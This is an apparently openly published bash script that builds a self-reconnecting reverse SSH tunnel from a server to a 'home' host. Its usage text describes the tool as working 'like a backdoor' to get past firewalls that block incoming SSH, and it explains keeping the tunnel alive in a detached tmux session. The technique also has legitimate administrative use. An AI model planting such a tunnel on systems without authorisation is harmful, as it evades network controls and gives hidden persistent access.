#!/usr/bin/env bash
## ----------------------------------------------------------------------- INFO
## [/usr/local/share/reverse_shells/rev_ssh.bash]
## author        : fantomH @alterEGO Linux
## created       : 2022-01-10 16:23:27 UTC
## updated       : 2023-11-16 11:54:13 UTC
## description   : Set up a reverse ssh connexion.

## ( COLORS )

  _BLUE="\033[34m"
  _BLUELESS=$(printf '%b' ${_BLUE})
  _BOLD="\033[1m"
  _BOLDLESS=$(printf ${_BOLD})
  _GREEN="\033[32m"
  _GREENLESS=$(printf '%b' ${_GREEN})
  _RED="\033[31m"
  _RESET="\033[0m"
  _RESETLESS=$(printf '%b' ${_RESET})

usage() {

    cat << EOF | more
## ------------------------------------------------------------------------- ##
##             { alterEGO Linux: "Open the vault of knowledge" }             ##
## ------------------------------------------------------------------------- ##

${_BOLDLESS}USAGE:${_RESETLESS} rev_ssh.bash <user@home_address:port>

This script creates a ssh reverse tunnel that allows you to bypass the firewall 
blocking ssh incomming connections on a server or PC.

Like a backdoor, it will call home and establish a secure connection within 
which you can call back using its reverse tunnelling feature.

On the server:

  $ bash rev_ssh.bash <user@home_address:port>

On the home machine:

  $ ssh -p <port> localhost

## [ ${_BLUELESS}${_BOLDLESS}How does it work: the basic${_RESETLESS} ]

SSH reverse tunneling uses local port forwarding on the local machine from an
already existing ssh connection:

  $ ssh user@local_machine

  local machine:22 <- ssh connection <- remote server

Using -R option, a specified port on the local machine will be listening and
forward the reverse connection through the secured tunnel to port 22 on the 
remote server.

                                         ssh tunnel
                                <-------------------------
  local machine:<local_port> ->    reversed connection     -> remote server:22
                                <-------------------------

• ServerAliveInterval=60

Usually, a ssh connection will timeout and disconnect from the server if no
data is received from the server. In order to bypass this, ServerAliveInterval
option sets automatic message every 60 seconds if no activity occurs.

## [ ${_BLUELESS}${_BOLDLESS}localhost${_RESETLESS} ]

ssh doesn't seem to require localhost to be defined to work, but it doesn't 
hurt to set the localhost in /etc/hosts like so:

  127.0.0.1        localhost
  ::1              localhost

## [ ${_BLUELESS}${_BOLDLESS}Password vs ssh-key${_RESETLESS} ]

Using this script with a password will work with limitation.

• The password to connect home will be required on first launch.
• The password will be required on every reconnections.

This is a problem knowing the script runs on the remote server...

To connect or reconnect automatically, it is a good idea to use a ssh key.

On the remote server:

  $ ssh-keygen -t rsa
  $ ssh-copy-id <user>@<home_address>

This will create a public and private key on the remote server, and then copy 
the public key to home.

## [ ${_BLUELESS}${_BOLDLESS}In the background with tmux${_RESETLESS} ]

Although running rev_ssh.bash by itself is nice, to enable a more permanent
reverse connection, you can use a multiplexer like tmux to keep the process
running, even if you logout from your remote server session.

  $ tmux new-session -d -s <session_name>
  $ tmux send-keys -t <session_name> "bash rev_ssh.bash <user@home_address:port>" enter

For example,

  $ tmux new-session -d -s ETphoneHOME
  $ tmux send-keys -t ETphoneHOME "bash rev_ssh.bash fantomH@192.168.0.150:6666" enter

Once the tmux session started and rev_ssh.bash running within it, you can 
logout. Unless you shutdown the remote server, the reverse ssh tunnel should 
be up for you to access from home.

If you want to access the tmux session later, to debbug or to kill the tunnel, 
you can access it like so:

  $ env TERM=screen-256color tmux -u a -t <session_name>

## [ ${_BLUELESS}${_BOLDLESS}Further reading${_RESETLESS} ]

• ServerFault - SSH remote port forwarding failed
  https://serverfault.com/questions/595323/ssh-remote-port-forwarding-failed/615751#615751

• SSH.com - SSH port forwarding - Example, command, server config
  https://www.ssh.com/academy/ssh/tunneling/example

• Dave McKay - What Is Reverse SSH Tunneling? (and How to Use It)
  https://www.howtogeek.com/428413/what-is-reverse-ssh-tunneling-and-how-to-use-it/

• Hussein Nasser - SSH Tunneling - Local & Remote Port Forwarding (by Example)
  https://www.youtube.com/watch?v=N8f5zv9UUMI

• branko, "Bypassing corporate firewall with reverse ssh port forwarding", think shell
  http://toic.org/blog/2009/reverse-ssh-port-forwarding/

## ------------------------------------------------------------- FIN ¯\_(ツ)_/¯
EOF
}

reverse_ssh() {
    ## ref. https://serverfault.com/a/615751
    printf '%b\n' "${_GREEN}[*]${_RESET} ${_BOLD}Initiating reverse ssh connection...${_RESET}"
    printf '%b\n' "${_BLUE}[-]${_RESET} ${_BOLD}Use ssh -p ${port} localhost at home...${_RESET}"
    while true; do
        ssh -f ${user}@${home_address} -R ${port}:localhost:22  -N -o ExitOnForwardFailure=yes -o ServerAliveInterval=60
        sleep 180
    done
}

case ${@} in

    *"@"*":"* )
        user=$(cut -d '@' -f1 <<< "${@}")
        home_address=$(grep -oP "(?<=@).*(?=:)" <<< "${@}")
        port=$(cut -d ':' -f2 <<< "${@}")
        reverse_ssh
        ;; 

    * ) usage;;

esac

## -------------------- [ TODO ]

## Include option --tmux

# vim: foldmethod=marker
## ------------------------------------------------------------- FIN ¯\_(ツ)_/¯
